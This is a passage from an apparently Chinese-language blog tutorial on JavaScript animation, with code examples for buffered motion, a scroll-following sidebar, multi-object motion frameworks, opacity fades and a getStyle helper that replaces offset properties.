scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	</div><div class="line">	//oDiv.style.top=document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop+&apos;px&apos;;</div><div class="line">	startMove(document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var timer=null;</div><div class="line"></div><div class="line">function startMove(iTarget)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-oDiv.offsetTop)/4;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(oDiv.offsetTop==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oDiv.style.top=oDiv.offsetTop+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="附"><a href="#附" class="headerlink" title="附"></a>附</h4><p>网页可见区域宽：document.body.clientWidth<br>网页可见区域高：document.body.clientHeight<br>网页可见区域宽：document.body.offsetWidth (包括边线的宽)<br>网页可见区域高：document.body.offsetHeight (包括边线的宽)<br>网页正文全文宽：document.body.scrollWidth<br>网页正文全文高：document.body.scrollHeight<br>网页被卷去的高：document.body.scrollTop<br>网页被卷去的左：document.body.scrollLeft<br>网页正文部分上：window.screenTop<br>网页正文部分左：window.screenLeft<br>屏幕分辨率的高：window.screen.height<br>屏幕分辨率的宽：window.screen.width<br>屏幕可用工作区高度：window.screen.availHeight<br>屏幕可用工作区宽度：window.screen.availWidth</p>
<p>//alert(Math.ceil(-9.8));            //向上取整<br>alert(Math.floor(4.9999));                //向下取整<br>alert(Math.abs(-6));                //取绝对值</p>
<h3 id="对联悬浮框"><a href="#对联悬浮框" class="headerlink" title="对联悬浮框"></a>对联悬浮框</h3><p>Bug：速度取整<br>跟随页面滚动的缓冲侧边栏</p>
<ul>
<li>潜在问题：目标值不是整数时<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:100px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">window.onscroll=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	//可视区的高-div的高，再除以二</div><div class="line">	//oDiv.style.top=(document.documentElement.clientHeight-oDiv.offsetHeight)/2+scrollTop+&apos;px&apos;;</div><div class="line">	startMove(parseInt((document.documentElement.clientHeight-oDiv.offsetHeight)/2+scrollTop));</div><div class="line">	// 目标取整 消除跳动</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var timer=null;</div><div class="line"></div><div class="line">function startMove(iTarget)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-oDiv.offsetTop)/4;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(oDiv.offsetTop==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			document.title=iTarget;</div><div class="line">			document.getElementById(&apos;txt1&apos;).value=oDiv.offsetTop;</div><div class="line">			oDiv.style.top=oDiv.offsetTop+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;txt1&quot; style=&quot;position:fixed; right:0; top:0;&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="匀速运动的停止条件"><a href="#匀速运动的停止条件" class="headerlink" title="匀速运动的停止条件"></a>匀速运动的停止条件</h3><p>运动终止条件</p>
<ul>
<li>匀速运动：距离足够近</li>
<li>缓冲运动：两点重合</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute; left:600px; top:50px;&#125;</div><div class="line">#div2 &#123;width:1px; height:300px; position:absolute; left:300px; top:0; background:black;&#125;</div><div class="line">#div3 &#123;width:1px; height:300px; position:absolute; left:100px; top:0; background:black;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">var timer=null;</div><div class="line"></div><div class="line">function startMove(iTarget)</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	clearInterval(timer);</div><div class="line">	timer=setInterval(function ()&#123;</div><div class="line">		var speed=0;</div><div class="line">		</div><div class="line">		if(oDiv.offsetLeft&lt;iTarget)</div><div class="line">		&#123;</div><div class="line">			speed=7;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			speed=-7;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		if(Math.abs(iTarget-oDiv.offsetLeft)&lt;=7)</div><div class="line">		&#123;</div><div class="line">			clearInterval(timer);</div><div class="line">			</div><div class="line">			oDiv.style.left=iTarget+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;input type=&quot;button&quot; value=&quot;到100&quot; onclick=&quot;startMove(100)&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;到300&quot; onclick=&quot;startMove(300)&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div3&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h1 id="JS运动应用"><a href="#JS运动应用" class="headerlink" title="JS运动应用"></a>JS运动应用</h1><h2 id="多物体运动框架"><a href="#多物体运动框架" class="headerlink" title="多物体运动框架"></a>多物体运动框架</h2><h3 id="多个物体同时运动"><a href="#多个物体同时运动" class="headerlink" title="多个物体同时运动"></a>多个物体同时运动</h3><h4 id="例子：多个Div，鼠标移入变宽"><a href="#例子：多个Div，鼠标移入变宽" class="headerlink" title="例子：多个Div，鼠标移入变宽"></a>例子：多个Div，鼠标移入变宽</h4><ul>
<li>单定时器，存在问题</li>
<li>每个Div一个定时器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:100px; height:50px; background:red; margin:10px; border:10px solid black;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aDiv.length;i++)</div><div class="line">	&#123;</div><div class="line">		aDiv[i].timer=null;   //每个Div都有一个定时器</div><div class="line">		</div><div class="line">		aDiv[i].onmouseover=function ()</div><div class="line">		&#123;</div><div class="line">			startMove(this, 400);</div><div class="line">		&#125;;</div><div class="line">		</div><div class="line">		aDiv[i].onmouseout=function ()</div><div class="line">		&#123;</div><div class="line">			startMove(this, 100);</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">//var timer=null;</div><div class="line"></div><div class="line">function startMove(obj, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-obj.offsetWidth)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(obj.offsetWidth==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.style.width=obj.offsetWidth+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="多物体运动框架-1"><a href="#多物体运动框架-1" class="headerlink" title="多物体运动框架"></a>多物体运动框架</h3><p>定时器作为物体的属性<br>参数的传递：物体、目标值</p>
<h4 id="例子：多个Div淡入淡出"><a href="#例子：多个Div淡入淡出" class="headerlink" title="例子：多个Div淡入淡出"></a>例子：多个Div淡入淡出</h4><ul>
<li>所有东西都不能公用</li>
<li>属性与运动对象绑定：速度、其他属性值（如透明度等）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aDiv.length;i++)</div><div class="line">	&#123;</div><div class="line">		aDiv[i].alpha=30;</div><div class="line">		</div><div class="line">		aDiv[i].onmouseover=function ()</div><div class="line">		&#123;</div><div class="line">			startMove(this, 100);</div><div class="line">		&#125;;</div><div class="line">		aDiv[i].onmouseout=function ()</div><div class="line">		&#123;</div><div class="line">			startMove(this, 30);</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">//var alpha=30;</div><div class="line"></div><div class="line">function startMove(obj, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-obj.alpha)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(obj.alpha==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.alpha+=speed;</div><div class="line">			</div><div class="line">			obj.style.filter=&apos;alpha(opacity:&apos;+obj.alpha+&apos;)&apos;;</div><div class="line">			obj.style.opacity=obj.alpha/100;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div><div class="line">&lt;div&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h4 id="例子：变宽变高"><a href="#例子：变宽变高" class="headerlink" title="例子：变宽变高"></a>例子：变宽变高</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv1.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, 400);</div><div class="line">	&#125;;</div><div class="line">	oDiv1.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, 200);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</div><div class="line">	</div><div class="line">	oDiv2.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove2(this, 400);</div><div class="line">	&#125;;</div><div class="line">	oDiv2.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove2(this, 200);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function startMove(obj, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-obj.offsetHeight)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(obj.offsetHeight==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.style.height=obj.offsetHeight+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function startMove2(obj, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var speed=(iTarget-obj.offsetWidth)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(obj.offsetWidth==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.style.width=obj.offsetWidth+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;变高&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;变宽&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="任意值运动框架"><a href="#任意值运动框架" class="headerlink" title="任意值运动框架"></a>任意值运动框架</h2><h3 id="offset属性的Bug"><a href="#offset属性的Bug" class="headerlink" title="offset属性的Bug"></a>offset属性的Bug</h3><p>有边框的Div变宽<br>用currentStyle代替offset</p>
<ul>
<li>offsetWidth(盒模型尺寸)=width+2<em>dorder+2</em>padding</li>
<li>styl只能去行间样式</li>
<li>getStyle<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function getStyle(obj, name)  //获取不在行间的样式  </div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:200px; height:200px; background:red; border:1px solid black;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script&gt;</div><div class="line">setInterval(function ()&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.width=oDiv.offsetWidth-1+&apos;px&apos;;</div><div class="line">&#125;, 30);  // =202-1=201  =201+1+1+1</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<ul>
<li>解决方案 用getStyle替换offset<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:200px; height:200px; background:red; border:1px solid black;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">function getStyle(obj, name)  //获取不在行间的样式  </div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setInterval(function ()&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.width=parseInt(getStyle(oDiv, &apos;width&apos;))-1+&apos;px&apos;;</div><div class="line">&#125;, 30);</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="去掉offset"><a href="#去掉offset" class="headerlink" title="去掉offset"></a>去掉offset</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; font-size:14px;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv1.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;height&apos;, 400);</div><div class="line">	&#125;;</div><div class="line">	oDiv1.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;height&apos;, 200);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</div><div class="line">	</div><div class="line">	oDiv2.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;width&apos;, 400);</div><div class="line">	&#125;;</div><div class="line">	oDiv2.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;width&apos;, 200);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	var oDiv3=document.getElementById(&apos;div3&apos;);</div><div class="line">	</div><div class="line">	oDiv3.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;fontSize&apos;, 50);</div><div class="line">	&#125;;</div><div class="line">	oDiv3.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;fontSize&apos;, 14);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	var oDiv4=document.getElementById(&apos;div4&apos;);</div><div class="line">	</div><div class="line">	oDiv4.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;borderWidth&apos;, 100);</div><div class="line">	&#125;;</div><div class="line">	oDiv4.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;borderWidth&apos;, 10);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function getStyle(obj, name)</div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function startMove(obj, attr, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var cur=parseInt(getStyle(obj, attr));</div><div class="line">		</div><div class="line">		var speed=(iTarget-cur)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(cur==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.style[attr]=cur+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;变高&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;变宽&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div3&quot;&gt;字符变大&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div4&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="原有运动框架的问题"><a href="#原有运动框架的问题" class="headerlink" title="原有运动框架的问题"></a>原有运动框架的问题</h3><ul>
<li>只能让某个值运动起来</li>
<li>如果想让其他值运动起来，要修改程序</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; filter:alpha(opacity:30); opacity:0.3;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div 